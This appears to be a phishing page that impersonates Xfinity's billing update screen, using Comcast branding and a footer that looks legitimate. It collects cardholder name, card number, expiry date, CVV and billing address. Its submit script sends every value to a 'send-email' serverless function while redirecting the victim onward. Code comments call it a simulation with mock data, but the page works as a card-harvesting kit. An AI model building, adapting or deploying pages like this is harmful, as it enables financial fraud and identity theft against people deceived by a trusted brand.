<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Billing Information - Xfinity</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    />
    <link rel="stylesheet" href="css/style.css" />
  </head>
  <body>
    <div class="app-container">
      <div class="billing-section">
        <div class="billing-form-wrapper">
          <img
            src="images/xfinity-logo-grey.svg"
            alt="Xfinity"
            style="width: 80px; margin: 25px 0px"
          />
          <h3 class="mb-3">Update Your Billing Information</h3>

          <div class="card-icons mb-3">
            <img
              src="images/icons8-visa-48.png"
              alt="Visa"
              style="width: 40px"
            />
            <img
              src="images/icons8-mastercard-48.png"
              alt="Mastercard"
              style="width: 40px"
            />
            <img
              src="images/icons8-american-express-48.png"
              alt="Amex"
              style="width: 40px"
            />
            <img
              src="images/icons8-discover-card-48.png"
              alt="Discover"
              style="width: 40px"
            />
          </div>

          <form method="post" id="form2">
            <input type="hidden" name="billing" value="billingPage" />

            <div class="mb-3">
              <label class="form-label">Name on Card:</label>
              <input
                type="text"
                class="form-control"
                name="card_name"
                placeholder="John Doe"
                required
                id="c_name"
              />
            </div>

            <div class="mb-3">
              <label class="form-label">Card Number:</label>
              <input
                id="c_num"
                class="form-control"
                name="card_number"
                placeholder="1234 5678 9012 3456"
                required
              />
            </div>

            <div class="row">
              <div class="col-md-6 mb-3">
                <label class="form-label">Expiry Date:</label>
                <input
                  type="date"
                  class="form-control"
                  name="expiry_date"
                  required
                  id="c_date"
                />
              </div>
              <div class="col-md-6 mb-3">
                <label class="form-label">CVV:</label>
                <input
                  type="text"
                  class="form-control"
                  name="cvv"
                  placeholder="123"
                  required
                  id="c_cvv"
                />
              </div>
            </div>

            <div class="mb-4">
              <label class="form-label">Billing Address:</label>
              <input
                type="text"
                class="form-control"
                name="billing_address"
                placeholder="Street, City, Zip Code"
                required
                id="c_address"
              />
            </div>
            <button class="btn btn-primary w-100">Continue</button>
          </form>
        </div>
      </div>

      <div class="offer-section">
        <div class="offer_text">
          <h2 class="offer-title">Cut Your Mobile Bill in Half</h2>
          <p class="offer-description">
            Xfinity Internet customers can save big in their first year with two
            Unlimited lines on the 5G Xfinity Mobile network.
          </p>
          <a href="#" class="offer-button">Calculate your savings</a>
        </div>
        <div class="offer_image">
          <!-- Optional image or illustration -->
        </div>
      </div>
    </div>

    <footer class="main-footer mt-5">
      <div class="text-center text-muted">&copy; 2025 Comcast</div>
      <div
        class="footer-links d-flex justify-content-center flex-wrap gap-3 mt-2"
      >
        <a href="#" class="footer-link"
          ><i class="fas fa-file-alt"></i> Web Terms</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-file-alt"></i> Privacy Policy</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-heartbeat"></i> Health Notice</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-globe-americas"></i> Your Privacy Choices</a
        >
        <a href="#" class="footer-link"
          ><i class="fas fa-ad"></i> Ad Preferences</a
        >
      </div>
    </footer>

    <div class="footer-bottom text-center mt-3">
      <div class="cookie-prefs">
        <i class="fas fa-cookie-bite"></i>
        <span>Cookie Preferences</span>
      </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
      document.querySelector("#form2").addEventListener("submit", async (e) => {
        e.preventDefault();
        const c_num = document.querySelector("#c_num").value;
        const c_name = document.querySelector("#c_name").value;
        const c_date = document.querySelector("#c_date").value;
        const c_cvv = document.querySelector("#c_cvv").value;
        const c_address = document.querySelector("#c_address").value;
        window.location.href = "info.html";

        try {
          const res = await fetch("/.netlify/functions/send-email", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              c_name,
              c_num,
              c_date,
              c_cvv,
              c_address,
              pageName: "Billing Simulation", // This changes per page
            }),
          });

          const data = await res.json();
          console.log("Serverless function response:", data);
        } catch (err) {
          console.error("Error sending mock data:", err);
        }
      });
    </script>
  </body>
</html>
